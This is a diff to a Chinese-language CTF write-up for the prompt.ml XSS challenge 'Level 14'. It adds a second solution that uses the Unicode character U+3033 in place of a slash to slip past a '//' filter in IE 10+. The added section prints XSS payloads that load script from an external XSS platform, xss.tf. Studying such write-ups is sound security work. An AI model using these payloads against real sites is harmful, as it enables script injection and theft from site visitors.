@@ -20,7 +20,7 @@ function escape(input) {
 }
 ```
 
-## 解题报告
+## 解题方法一（Base64）
 
 ### 前置知识
 
@@ -244,7 +244,7 @@ HTTPS:XSS%2E%54%46/TOH>
 - `HTTPS:` 后面可以不带 `//`
 - `HTTPS:` 后面的 URL 部分可以使用 URL 编码，当单纯的字母无法构造大写编码时，试试 `%`
 - URL 末尾可以利用参数符号 `?` 进行错位
-- URL 开头可以利用 Basic Auth 进行错位 `user:pass@`
+- URL 开头可以利用 Basic Auth 进行错位 `user:pass@`（可参考 【[Level 04 - Basic Auth](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2004%20-%20Basic%20Auth)】）
 - 大写字母 Base64 编码后更容易得到另一个大写字母
 - 被编码的的字符串越短越容易控制
 
@@ -389,6 +389,51 @@ HTTPS:E.XP>
 不过即使能点击也没用，现代的浏览器为了避免 `<a>` 标签的 Data URIs 被用于跨站攻击，默认都是拦截掉请求了：
 
 ![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/17.png)
+
+------------
+
+## 解题方法二（Unicode）
+
+### 前置知识
+
+- [相对协议地址](http://blog.httpwatch.com/2010/02/10/using-protocol-relative-urls-to-switch-between-http-and-https/)
+- [Unicode 字符编码](https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8)
+- [`<script>` 异步执行属性 `async`](http://www.w3school.com.cn/html5/att_script_async.asp)
+
+
+------------
+
+### 黑魔法：MSIE
+
+**这种解题方法只能在 MSIE（Microsoft IE）中使用**，而且版本要求是 IE 10 以上。
+
+关键在于使用 Unicode 编码绕过题目的 `//` 过滤，在 IE 10 中，第二个正斜杠是允许使用 Unicode 的 `〳` 代替的。
+
+> 注：[`〳` 其实就是中文的笔画符号【撇】，编码是 U+3033](https://www.compart.com/en/unicode/U+3033)
+
+利用[前面](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2014%20-%20Base64#%E5%88%A9%E7%94%A8-xss-%E5%B9%B3%E5%8F%B0%E5%AE%8C%E6%88%90%E6%8C%91%E6%88%98)已经在 XSS 平台构造好的项目地址（[http://xss.tf/tOH](http://xss.tf/tOH)），构造 payload 如下：
+
+```html
+"><script/src="/〳xss.tf/tOH
+```
+
+注意到除了利用 Unicode 编码绕过 `//` 过滤，还隐去了 `http:` 绕过了 `\w:` 过滤。
+
+之所以可以隐去 `http:` ，是因为在 html 的 `src` 属性中可以使用 [相对协议地址](http://blog.httpwatch.com/2010/02/10/using-protocol-relative-urls-to-switch-between-http-and-https/) 原理：此时前端获取资源时会根据所访问 URL 的协议而自适应（即自动识别 http 或 https）。
+
+但是这个 payload 因为引用的是外部资源，所以虽然我们在 XSS 平台 [http://xss.tf/tOH](http://xss.tf/tOH) 构造好了 `prompt(1)` ，但是它并不会被执行。
+
+为此可以修改 payload 为：
+
+```html
+"><script/async/src="/〳xss.tf/tOH
+```
+
+看到加了 `async` 属性，其效果是一旦 `src` 引用的脚本资源可用，就会异步执行。
+
+在 IE 10 或 IE 11 上输入这个 payload ，完成挑战：
+
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/18.png)
 
 ------
 
